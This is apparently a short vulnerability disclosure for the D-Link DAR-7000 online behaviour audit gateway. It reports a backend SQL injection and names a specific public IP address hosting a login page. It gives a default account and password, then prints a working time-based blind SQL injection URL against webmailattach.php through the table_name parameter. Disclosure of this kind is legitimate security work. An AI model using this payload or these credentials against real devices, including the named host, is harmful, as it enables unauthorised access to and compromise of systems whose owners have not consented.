There is a backend SQL injection vulnerability in the D-LINK DAR-7000 series online behavior audit gateway. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official http://www.dlink.com.cn/

version:DAR-7000

See the login page.

https://60.22.74.195:8443/





<img width="648" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/612aba0f-6145-447f-bdfe-3d8d832dfa2f">









There is a default account password present： test/admin@123


<img width="644" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/81629f5d-ed48-4bf0-81cf-bb5473634ee2">





poc：

url: https://60.22.74.195:8443/log/webmailattach.php?attach1=&attach2=(null)&table_name=tb_admin+where+1=1+and+(select*from(select(sleep(3)))a)%23&mail_file_path=1，

<img width="649" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/a2433313-2325-4711-a0a7-b1c45d5633c8">
